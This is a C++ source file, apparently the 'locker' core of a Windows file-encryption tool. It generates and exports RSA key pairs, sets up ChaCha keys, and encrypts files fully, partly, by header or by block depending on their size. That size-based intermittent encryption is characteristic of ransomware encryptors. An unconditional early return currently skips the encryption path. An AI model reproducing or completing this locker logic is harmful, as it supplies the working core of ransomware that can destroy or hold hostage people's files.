#include <windows.h>
#include "locker.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"

#include <stdio.h>
#include <cstdint>
#include <string>


STATIC VOID PrintHex(const BYTE* data, DWORD size)
{
	for (size_t i = 0; i < size; ++i)
	{
		printf_s("%02X ", data[i]);
		if ((i + 1) % 32 == 0) printf("\n");
	}
	printf_s("\n");
}

STATIC VOID HandlerSymmetricGenKey(locker::PFILE_INFO FileInfo, const BYTE* ChaChaKey, const BYTE* ChaChaIV)
{	
	RtlSecureZeroMemory(&FileInfo->CryptCtx, sizeof(FileInfo->CryptCtx));
	ECRYPT_keysetup(&FileInfo->CryptCtx, ChaChaKey, 256, 64);
	ECRYPT_ivsetup(&FileInfo->CryptCtx, ChaChaIV);
}


BOOL locker::HandlerASymmetricGenKey()
{
	HCRYPTPROV CryptoProvider;
	HCRYPTKEY RsaKey;

	if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		printf_s("Failed create provider. GetLastError = %lu.\n", GetLastError());		
		return FALSE;
	}
		
	if (!CryptGenKey(CryptoProvider, AT_KEYEXCHANGE, global::GetBitKey() | CRYPT_EXPORTABLE, &RsaKey))
	{		
		printf_s("Failed gen key. GetLastError = %lu.\n", GetLastError());
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}


	DWORD SizeKey = 0;
	BYTE PublicKey[4096];
	if (!CryptExportKey(RsaKey, 0, PUBLICKEYBLOB, 0, NULL, &SizeKey))
	{
		printf("Failed to get public key length. GetLastError = %lu\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}

	if (!CryptExportKey(RsaKey, 0, PUBLICKEYBLOB, 0, PublicKey, &SizeKey))
	{
		printf_s("Failed export Key. GetLastError = %lu.\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}


	BYTE PrivateKey[4096];
	DWORD p_SizeKey = 0;
	if (!CryptExportKey(RsaKey, 0, PRIVATEKEYBLOB, 0, NULL, &p_SizeKey))
	{
		printf("Failed to get private key length. GetLastError = %lu\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}

	if (!CryptExportKey(RsaKey, 0, PRIVATEKEYBLOB, 0, PrivateKey, &p_SizeKey))
	{
		printf("Failed to export private key. GetLastError = %lu\n", GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}


	if (!filesystem::DropRSAKey(global::GetPath(), PublicKey, PrivateKey, SizeKey, p_SizeKey))
	{
		printf("Failed to drop RSA key to path %ls. GetLastError = %lu\n", global::GetPath(), GetLastError());
		CryptDestroyKey(RsaKey);
		CryptReleaseContext(CryptoProvider, 0);
		return FALSE;
	}

	printf("Public Key (%lu bytes) generated and saved in: %ls\n", SizeKey, global::GetPath());
	printf("Private Key (%lu bytes) generated and saved in: %ls\n", p_SizeKey, global::GetPath());

	if (global::GetPrintHex())
	{
		printf_s("Public Key\n");
		PrintHex(PublicKey, SizeKey);
		printf_s("Private Key\n");
		PrintHex(PrivateKey, p_SizeKey);
	}


	RtlSecureZeroMemory(PrivateKey, p_SizeKey);
	RtlSecureZeroMemory(PublicKey, SizeKey);

	CryptDestroyKey(RsaKey);
	CryptReleaseContext(CryptoProvider, 0);
	return TRUE;
}



BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList)
{
	//if ("VerifyTRUE" && HashList != NULL)
	if (TRUE)
	{		
		if (!filesystem::VerifySignatureRSA(HashList, FPAth, Filename))
		{
			printf_s("Failed get sha...\n");
		}
	}
	return TRUE;

	WCHAR* newFilename = filesystem::MakeCopyFile(Path, Filename, Exs, FPAth);
	
	if (global::GetEncrypt() == SYMMETRIC)
	{
		locker::FILE_INFO FileInfo;		
		FileInfo.FilePath = FPAth;
		FileInfo.Filename = Filename;
		HandlerSymmetricGenKey(&FileInfo, global::GetKey(), global::GetIV());		
		if (filesystem::getParseFile(&FileInfo) && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
		{			
			if (global::GetEncMode() == AUTO_ENCRYPT)
			{
				if (FileInfo.Filesize <= 1048576)
				{
					if (!filesystem::EncryptFileFullData(&FileInfo, newFilename))
					{
						printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", Filename, GetLastError());
					}
				}
				else if (FileInfo.Filesize <= 5242880)
				{
					if (!filesystem::EncryptFilePartly(&FileInfo, newFilename, 20))
					{
						printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", Filename, GetLastError());
					}
				}
				else
				{
					if (!filesystem::EncryptFileHeader(&FileInfo, newFilename))
					{
						printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());
					}
				}
			}
			else if (global::GetEncMode() == FULL_ENCRYPT)
			{
				if (!filesystem::EncryptFileFullData(&FileInfo, newFilename))
				{
					printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", Filename, GetLastError());
				}
			}
			else if (global::GetEncMode() == PARTLY_ENCRYPT)
			{
				if (!filesystem::EncryptFilePartly(&FileInfo, newFilename, 20))
				{
					printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", Filename, GetLastError());
				}
			}
			else if (global::GetEncMode() == HEADER_ENCRYPT)
			{

				if (!filesystem::EncryptFileHeader(&FileInfo, newFilename))
				{
					printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());					
				}
			}
			else if (global::GetEncMode() == BLOCK_ENCRYPT)
			{
				if (!filesystem::EncryptFileBlock(&FileInfo, newFilename))
				{
					printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", Filename, GetLastError());
				}
			}
			else if (global::GetStatus())
			{
				filesystem::ReadFile_(&FileInfo);
			}
		}
		else
		{
			printf_s("Failed ParseFile %ls. GetLastError = %lu. \n", Filename, GetLastError());
		}
		RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));		
	}
	else if (global::GetEncrypt() == ASYMMETRIC)	
	{
		if (global::GetDeCrypt() == CRYPT)
		{
			if (!filesystem::FileCryptEncrypt(global::GetPathRSAKey(), FPAth, newFilename))
			{
				printf_s("Failed CryptEncrypt\n");
			}			
		}
		else if (global::GetDeCrypt() == DECRYPT)
		{			
			if (!filesystem::FileCryptDecrypt(global::GetPathRSAKey(), FPAth, newFilename))
			{
				printf_s("Failed CryptDecrypt\n");
			}
		}		
	}
	else if (global::GetEncrypt() == RSA_ONLY)	
	{
		if (global::GetDeCrypt() == CRYPT)
		{
			if (!filesystem::EncryptRSA(global::GetPathRSAKey(), FPAth, newFilename))
			{
				printf_s("Failed Encrypt RSA\n");
			}
		}
		else if (global::GetDeCrypt() == DECRYPT)
		{		
			if (!filesystem::EncryptRSA(global::GetPathRSAKey(), FPAth, newFilename))
			{
				printf_s("Failed Decrypt RSA\n");
			}
			
		}
	}
	memory::m_free(newFilename);
	return TRUE;
}
